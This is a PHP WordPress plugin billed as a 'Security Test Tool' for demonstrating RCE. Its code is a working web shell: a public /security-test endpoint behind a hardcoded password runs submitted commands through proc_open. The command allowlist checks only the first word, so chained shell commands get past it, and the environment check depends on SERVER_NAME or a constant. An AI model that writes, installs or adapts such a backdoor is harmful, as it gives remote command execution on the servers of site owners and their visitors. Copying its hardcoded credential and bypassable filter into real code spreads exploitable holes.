<?php
/**
 * Plugin Name: Security Test Tool
 * Description: A security testing tool with password protection for demonstration of RCE vulnerabilities
 * Version: 1.0
 * Author: Security Tester
 */

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

class Security_Test_Tool {
    // Hardcoded password - in a real plugin this should be configurable and properly hashed
    private $access_password = 'S3cur3P4ssw0rd123!';
    
    public function __construct() {
        // Register our custom endpoint
        add_action('init', array($this, 'register_custom_endpoint'));
        
        // Add menu item in WordPress admin
        add_action('admin_menu', array($this, 'add_admin_menu'));
        
        // Add security nonce for admin actions
        add_action('admin_init', array($this, 'security_checks'));
    }
    
    /**
     * Register a custom endpoint for our tool
     */
    public function register_custom_endpoint() {
        add_rewrite_rule(
            'security-test/?$',
            'index.php?security_test=true',
            'top'
        );
        add_rewrite_tag('%security_test%', '([^&]+)');
        
        // This is important - only run once
        if (!get_option('security_test_flush_rewrite')) {
            flush_rewrite_rules();
            update_option('security_test_flush_rewrite', true);
        }
        
        // Handle requests to our endpoint
        add_action('template_redirect', array($this, 'handle_request'));
    }
    
    /**
     * Add admin menu
     */
    public function add_admin_menu() {
        add_management_page(
            'Security Test Tool',
            'Security Test',
            'manage_options',
            'security-test-tool',
            array($this, 'admin_page')
        );
    }
    
    /**
     * Set up security checks
     */
    public function security_checks() {
        // Only allow in specific testing environments
        if (!$this->is_test_environment()) {
            // Log attempt and disable functionality
            error_log('Security Test Tool: Attempt to use in non-testing environment');
            return;
        }
    }
    
    /**
     * Check if we're in a testing environment
     */
    private function is_test_environment() {
        // Check if we're on a testing domain or have a specific constant defined
        $server_name = isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : '';
        return (
            $server_name === 'kubernetes.docker.internal' || 
            $server_name === 'localhost' || 
            (defined('SECURITY_TESTING_ENABLED') && SECURITY_TESTING_ENABLED === true)
        );
    }
    
    /**
     * Handle requests to our endpoint
     */
    public function handle_request() {
        if (!get_query_var('security_test')) {
            return;
        }
        
        // Only allow in test environments
        if (!$this->is_test_environment()) {
            wp_die('This tool is only available in testing environments');
        }
        
        // Output our interface
        $this->render_interface();
        exit;
    }
    
    /**
     * Render the interface
     */
    private function render_interface() {
        // Check if we should process a command
        $command_output = '';
        $authenticated = false;
        $password_attempt = isset($_POST['password']) ? sanitize_text_field($_POST['password']) : '';
        
        if (!empty($password_attempt)) {
            if ($password_attempt === $this->access_password) {
                $authenticated = true;
                
                // Process command if submitted
                if (isset($_POST['command']) && !empty($_POST['command'])) {
                    $command = $_POST['command'];
                    // Execute the command and capture output
                    $command_output = $this->execute_command($command);
                }
            } else {
                $command_output = "Invalid password";
            }
        }
        
        // Very basic styling
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Security Test Tool</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1 { color: #333; }
                .warning { color: red; font-weight: bold; }
                pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow: auto; }
                form { margin: 20px 0; }
                input[type="password"], input[type="text"] { padding: 8px; width: 300px; }
                button { padding: 8px 15px; background: #0073aa; color: white; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Security Test Tool</h1>
                <p class="warning">WARNING: This tool is for security testing purposes only and should only be used in controlled environments.</p>';
        
        if (!$authenticated) {
            // Show password form
            echo '<form method="post">
                <p>Enter password to access the tool:</p>
                <input type="password" name="password" required>
                <button type="submit">Submit</button>
            </form>';
            
            if (!empty($command_output)) {
                echo '<p>' . esc_html($command_output) . '</p>';
            }
        } else {
            // Show command interface
            echo '<form method="post">
                <input type="hidden" name="password" value="' . esc_attr($password_attempt) . '">
                <p>Enter command to execute:</p>
                <input type="text" name="command" required>
                <button type="submit">Execute</button>
            </form>';
            
            // Display command output if any
            if (!empty($command_output)) {
                echo '<h3>Command Output:</h3>
                <pre>' . esc_html($command_output) . '</pre>';
            }
        }
        
        echo '</div></body></html>';
    }
    
    /**
     * Execute a command and return the output
     */
    private function execute_command($command) {
        // Restrict to specific commands for a bit more safety
        $allowed_commands = array('whoami', 'ls', 'ps', 'netstat', 'ifconfig', 'ping', 'cat', 'grep', 'find');
        $command_parts = explode(' ', $command);
        $base_command = $command_parts[0];
        
        // Check if this is an allowed command (can be adjusted per your testing needs)
        if (!in_array($base_command, $allowed_commands)) {
            return "Command not allowed. Allowed commands: " . implode(', ', $allowed_commands);
        }
        
        // Execute the command using proc_open for better control
        $descriptors = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        
        $process = proc_open($command, $descriptors, $pipes);
        
        if (is_resource($process)) {
            // Close stdin
            fclose($pipes[0]);
            
            // Read stdout
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            
            // Read stderr
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            
            // Close process
            $return_value = proc_close($process);
            
            if ($return_value !== 0) {
                return "Error executing command: " . $error;
            }
            
            return $output;
        }
        
        return "Failed to execute command";
    }
    
    /**
     * Admin page content
     */
    public function admin_page() {
        echo '<div class="wrap">';
        echo '<h1>Security Test Tool</h1>';
        echo '<p>This plugin provides a test endpoint for security demonstrations.</p>';
        echo '<p>Access the tool at: <code>' . esc_url(home_url('security-test')) . '</code></p>';
        echo '<p class="description">The tool is protected with a hardcoded password.</p>';
        echo '<div class="notice notice-warning"><p><strong>Warning:</strong> This plugin is for security testing only and should be removed after testing is complete.</p></div>';
        echo '</div>';
    }
}

// Initialize the plugin
new Security_Test_Tool();
